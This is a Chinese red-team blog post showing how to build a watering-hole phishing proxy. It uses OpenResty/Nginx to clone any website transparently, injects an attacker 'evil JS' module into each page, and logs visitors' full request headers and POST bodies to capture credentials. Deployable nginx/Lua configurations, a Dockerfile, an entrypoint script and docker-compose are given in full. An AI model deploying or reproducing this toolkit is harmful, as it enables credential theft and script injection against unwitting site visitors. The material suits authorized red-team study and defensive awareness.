<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>红队技巧：基于反向代理的水坑攻击 « 倾旋的博客</title>
  <meta name="description" content="完整项目代码：https://github.com/Rvn0xsy/Pricking0x00 前言在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。0x01 ...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2021-02-16/1">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">红队技巧：基于反向代理的水坑攻击</h1>
    <p class="post-meta">Feb 16, 2021</p>
  </header>

  <article class="post-content">
    <p>完整项目代码：https://github.com/Rvn0xsy/Pricking</p>

<h2 id="0x00-前言">0x00 前言</h2>

<p>在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。</p>

<h2 id="0x01-实现目标">0x01 实现目标</h2>

<p>先明确一下实现目标：</p>

<ul>
  <li>支持快速部署</li>
  <li>完美克隆任意网站</li>
  <li>可扩展的模块（受害者执行）</li>
  <li>收集所有凭证（除了Cookie还有POST数据）</li>
</ul>

<h2 id="0x02-快速部署与完美克隆">0x02 快速部署与完美克隆</h2>

<p>互联网上有许多网页克隆的工具，大多都是将网页的前端文件（html、js、图片等）下载到本地，这个方式即使自动化也很难与网站真实后端无缝对接。于是我采用Nginx的反向代理功能来实现完美克隆，让我的Web服务器充当一个真实的客户端。但Nginx本身默认情况下，没办法做到很灵活的逻辑操作，因此需要采用OpenResty内置的Lua脚本Block。</p>

<p><a href="http://openresty.org/cn/">OpenResty®</a> 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p>

<p>根据它的官方文档和<a href="https://github.com/openresty/docker-openresty">开源仓库</a>我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。</p>

<p>首先拉取镜像到本地，方便后续的操作：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker pull openresty/openresty:alpine
</code></pre></div></div>

<h3 id="openresty配置文件">OpenResty配置文件</h3>

<p>OpenResty Docker环境共有两块需要关注的配置文件：</p>

<ul>
  <li>/etc/nginx/conf.d</li>
  <li><a href="https://github.com/openresty/docker-openresty/blob/master/nginx.conf">/usr/local/openresty/nginx/conf/nginx.conf</a></li>
</ul>

<p>其中主配置文件是最精简的，我根据OpenResty的文档优化了一个，后续Dockerfile的编写也是替换的主配置文件。</p>

<h3 id="openresty---lua-ngx-api">OpenResty - Lua Ngx API</h3>

<p>若想要在Nginx配置中执行Lua代码，需要遵循<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API</a>，文档中提供了<code class="language-plaintext highlighter-rouge">*_by_lua</code>，<code class="language-plaintext highlighter-rouge">*_by_lua_block</code>和<code class="language-plaintext highlighter-rouge">*_by_lua_file</code>来引入Lua代码。</p>

<p><code class="language-plaintext highlighter-rouge">nginx.conf</code>简单实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>worker_processes  1;

error_log  logs/error.log error;    # 日志级别

events {
    worker_connections  1024;
}

http {
    server {
        listen    80;
        location / {
            content_by_lua_block {
                ngx.say("Hello,Rvn0xsy");
            }
        }
    }
}
</code></pre></div></div>

<p>当OpenResty环境以<code class="language-plaintext highlighter-rouge">nginx.conf</code>作为配置文件启动的话，访问网站会输出<code class="language-plaintext highlighter-rouge">Hello,Rvn0xsy</code>。</p>

<h3 id="lua-ngx-api---block">Lua Ngx API - Block</h3>

<p>《OpenResty 最佳实践》中提供了一个流程图：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f574b2d15e2743767e2914af6691728.png" alt="2021-02-16-16-48-59"></p>

<p>根据这个流程图，可以将Lua代码放入不同的流程中对数据进行修改、删除、添加等。</p>

<p>如上面的<code class="language-plaintext highlighter-rouge">Hello,Rvn0xsy</code>例子，就是通过<code class="language-plaintext highlighter-rouge">content_by_lua_block</code>这个环节对响应内容进行修改。</p>

<p>本文用到的Block有：</p>

<ul>
  <li>header_filter_by_lua_block 用于修改响应头</li>
  <li>body_filter_by_lua_block 用于修改响应内容，注入JS</li>
  <li>log_by_lua_block 用于记录请求日志或凭证</li>
</ul>

<h3 id="nginx-反向代理配置">Nginx 反向代理配置</h3>

<p><a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/">Nginx反向代理</a>配置起来非常简单。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location /some/path/ {
    proxy_pass http://www.example.com/link/;
}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">location</code>用于做URI匹配，当访问到<code class="language-plaintext highlighter-rouge">/some/path/</code>这个路径时，Nginx就代表客户端去访问<code class="language-plaintext highlighter-rouge">http://www.example.com/link/</code>，整个过程对客户端是完全透明的。</p>

<p>根据这个实例，可以直接写下第一部分，反向代理的配置了：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location / {
    proxy_pass http://www.example.com/link/;
}
</code></pre></div></div>

<p>访问根目录就等同于访问<code class="language-plaintext highlighter-rouge">http://www.example.com/link/</code>。</p>

<p>这里可能会产生一个问题，如果目标Web服务器对Host进行了判断，那么反向代理可能不会成功，因此需要将完美克隆的目标Host进行设置。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>worker_processes  1;

error_log  logs/error.log error;    # 日志级别

events {
    worker_connections  1024;
}

http {
    server {
        listen    80;
        server_name example-1.com;
        location / {
            proxy_pass http://www.example.com/link/;
            proxt_set_header Host www.example.com;
            proxt_set_header Referer http://www.example.com/link/;
        }
    }
}
</code></pre></div></div>

<p>至此，就能完美克隆目标网站了。</p>

<h2 id="0x03-注入模块化的evil-js">0x03 注入模块化的Evil JS</h2>

<p>使用<code class="language-plaintext highlighter-rouge">body_filter_by_lua_block</code>可以对网站内容进行修改，利用好这个功能，就能将JS文件引入到页面中。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>header_filter_by_lua_block { ngx.header.content_length = nil}
                body_filter_by_lua_block{
                        local chunk, eof = ngx.arg[1], ngx.arg[2]
                        local buffered = ngx.ctx.buffered
                        if not buffered then
                           buffered = {}
                           ngx.ctx.buffered = buffered
                        end
                        if chunk ~= "" then
                           buffered[#buffered + 1] = chunk
                           ngx.arg[1] = nil
                        end
                        if eof then
                           local whole = table.concat(buffered)
                           ngx.ctx.buffered = nil
                           whole = whole .. "&lt;script src='/7276df76835ed2272cc0e59f55e49902/static.js' type='module'&gt;&lt;/script&gt;"
                           ngx.arg[1] = whole
                        end
                }

</code></pre></div></div>

<p>在修改网页内容之前，需要通过<code class="language-plaintext highlighter-rouge">header_filter_by_lua_block</code>将<code class="language-plaintext highlighter-rouge">Content-Length</code>进行清空，因为修改后，<code class="language-plaintext highlighter-rouge">Content-Length</code>的大小一定是改变的。</p>

<h3 id="使用es6标准将js模块化">使用ES6+标准将JS模块化</h3>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">'/7276df76835ed2272cc0e59f55e49902/static.js'</span> <span class="na">type=</span><span class="s">'module'</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div></div>

<p>其中<code class="language-plaintext highlighter-rouge">static.js</code>就是引入的Evil JS，添加了<code class="language-plaintext highlighter-rouge">type='module'</code>是为了启用<a href="https://www.freecodecamp.org/news/learn-modern-javascript/">ES6+</a>标准。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8e4954b7fb5035a91688a21d78633140.png" alt="2021-02-16-17-10-54"></p>

<p>为了不和源站的目录冲突，<code class="language-plaintext highlighter-rouge">7276df76835ed2272cc0e59f55e49902</code>其实是一个虚拟的目录，通过<code class="language-plaintext highlighter-rouge">location</code>映射即可。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
                alias    /tmp/pricking/static/;
}
</code></pre></div></div>

<p>关于Import的说明可以看<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import">这篇文章</a>。</p>

<p>使用模块化功能可以让这个项目吸收更多关于浏览器丰富的操作，就像XSS平台那样。</p>

<h2 id="0x04-记录日志或凭证">0x04 记录日志或凭证</h2>

<p>由于<code class="language-plaintext highlighter-rouge">log_by_lua_block</code>是最后一个流程，可以把一些数据进行收集，写入日志文件。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...

http {
    ....
    log_format  logeverything  '$current_time - $remote_addr \n$request_headers \n\n$request_body\n';
  
    server {
            set $request_headers "";
            set $current_time "";
           ....

            location / {
                ...
                log_by_lua_block {
                    ngx.var.current_time = ngx.localtime()                  
                    ngx.var.request_headers = ngx.req.raw_header()
                }
        }
        access_log /tmp/pricking/access.log logeverything;
    }
}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ngx.localtime()</code>和<code class="language-plaintext highlighter-rouge">ngx.req.raw_header()</code>是调用了<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API</a>。</p>

<h2 id="0x05-最终配置">0x05 最终配置</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>worker_processes  1;
events {
    worker_connections  1024;
}


http {
    include       mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    log_format  logeverything  '$current_time - $remote_addr \n$request_headers \n\n$request_body\n';
    

    server {
            set $request_headers "";
            set $current_time "";

            server_name proxy.payloads.online;
            listen 80;

            location ^~ /7276df76835ed2272cc0e59f55e49902/ {
                alias    /tmp/pricking/static/;
            }


            location / {
                proxy_pass http://payloads.online;
                proxy_set_header Host payloads.online;
                header_filter_by_lua_block { ngx.header.content_length = nil}
                body_filter_by_lua_block{
                        local chunk, eof = ngx.arg[1], ngx.arg[2]
                        local buffered = ngx.ctx.buffered
                        if not buffered then
                           buffered = {}
                           ngx.ctx.buffered = buffered
                        end
                        if chunk ~= "" then
                           buffered[#buffered + 1] = chunk
                           ngx.arg[1] = nil
                        end
                        if eof then
                           local whole = table.concat(buffered)
                           ngx.ctx.buffered = nil
                           whole = whole .. "&lt;script src='/7276df76835ed2272cc0e59f55e49902/static.js' type='module'&gt;&lt;/script&gt;"
                           ngx.arg[1] = whole
                        end
                }
                log_by_lua_block {
                    ngx.var.current_time = ngx.localtime()                  
                    ngx.var.request_headers = ngx.req.raw_header()
                }
        }
        access_log /tmp/pricking/access.log logeverything;
    }
}
</code></pre></div></div>

<h2 id="0x06-dockerfile编写">0x06 Dockerfile编写</h2>

<p>Dockerfile :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM openresty/openresty:alpine
ENV PROXY_PASS_HOST www.baidu-proxy.com # 自己的域名
ENV PROXY_SOURCE_HOST www.baidu.com # 要克隆的域名
ENV NGINX_LISTEN_PORT 80 # 监听端口，不建议改动
ENV EVIL_JS_URI b026324c6904b2a9cb4b88d6d61c81d1 # JS虚拟目录名称
WORKDIR /tmp/
COPY nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
COPY docker-entrypoint.sh /tmp/docker-entrypoint.sh
RUN mkdir -p /tmp/pricking/static/ &amp;&amp; chmod +x /tmp/docker-entrypoint.sh 
ENTRYPOINT ["/tmp/docker-entrypoint.sh"]
</code></pre></div></div>

<p>通过设置环境变量的值，就能完美克隆任意网站。</p>

<p>docker-entrypoint.sh :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
<span class="nb">echo</span> <span class="s2">"[+] Replace evil js URI..."</span>

<span class="nb">sed</span> <span class="nt">-e</span> <span class="s1">'s/7276df76835ed2272cc0e59f55e49902/b026324c6904b2a9cb4b88d6d61c81d1/'</span> <span class="se">\</span>
        <span class="nt">-e</span> <span class="s2">"18s/proxy.payloads.online/</span><span class="nv">$PROXY_PASS_HOST</span><span class="s2">/g"</span> <span class="se">\</span>
        <span class="nt">-e</span> <span class="s2">"27s/payloads.online/</span><span class="nv">$PROXY_SOURCE_HOST</span><span class="s2">/g"</span> <span class="se">\</span>
        <span class="nt">-e</span> <span class="s2">"28s/payloads.online/</span><span class="nv">$PROXY_SOURCE_HOST</span><span class="s2">/g"</span> <span class="se">\</span>
        <span class="nt">-e</span> <span class="s2">"19s/80/</span><span class="nv">$NGINX_LISTEN_PORT</span><span class="s2">/g"</span> /usr/local/openresty/nginx/conf/nginx.conf <span class="o">&gt;</span> /usr/local/openresty/nginx/conf/nginx.conf.new
<span class="nb">mv</span> /usr/local/openresty/nginx/conf/nginx.conf.new /usr/local/openresty/nginx/conf/nginx.conf

<span class="nb">echo</span> <span class="s2">"[+] Replace server name : </span><span class="nv">$PROXY_PASS_HOST</span><span class="s2">"</span>

<span class="nb">echo</span> <span class="s2">"[+] Listen PORT : </span><span class="nv">$NGINX_LISTEN_PORT</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"[+] Proxy Pass Host : </span><span class="nv">$PROXY_SOURCE_HOST</span><span class="s2">"</span>

<span class="nb">echo</span> <span class="s2">"[+] Evil js URL :  </span><span class="nv">$PROXY_PASS_HOST</span><span class="s2">/</span><span class="nv">$EVIL_JS_URI</span><span class="s2">/static.js"</span>
/usr/local/openresty/nginx/sbin/nginx <span class="nt">-g</span> <span class="s2">"daemon off;"</span> <span class="nt">-c</span> /usr/local/openresty/nginx/conf/nginx.conf
</code></pre></div></div>

<h2 id="0x07-docker-compose">0x07 docker-compose</h2>

<p>我将镜像上传到了Docker镜像源中，可以通过如下docker-compose.yml创建实例：</p>

<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
<span class="na">services</span><span class="pi">:</span>
  <span class="na">nginx</span><span class="pi">:</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s">rvn0xsy/pricking:v1</span>
    <span class="na">ports</span><span class="pi">:</span>
     <span class="pi">-</span> <span class="s2">"</span><span class="s">80:80"</span>
    <span class="na">volumes</span><span class="pi">:</span>
     <span class="pi">-</span> <span class="s">/tmp/pricking:/tmp/pricking</span>
    <span class="na">environment</span><span class="pi">:</span>
      <span class="na">PROXY_PASS_HOST</span><span class="pi">:</span> <span class="s">proxy.payloads.online</span>
      <span class="na">PROXY_SOURCE_HOST</span><span class="pi">:</span> <span class="s">payloads.online</span>
      <span class="na">NGINX_LISTEN_PORT</span><span class="pi">:</span> <span class="m">80</span>
      <span class="na">EVIL_JS_URI</span><span class="pi">:</span> <span class="s">b026324c6904b2a9cb4b88d6d61c81d1</span>
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/90e7da8488bdf08b40b763330aaa583f.png" alt="2021-02-16-17-40-24"></p>

<p>日志：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2bbb5c207533adc7845d579c730bdd84.png" alt="2021-02-16-17-41-55"></p>

<h2 id="参考">参考</h2>

<ul>
  <li>https://github.com/openresty/docker-openresty</li>
  <li>https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/</li>
  <li>https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/</li>
  <li>https://www.freecodecamp.org/news/learn-modern-javascript/</li>
  <li>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import</li>
</ul>


  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
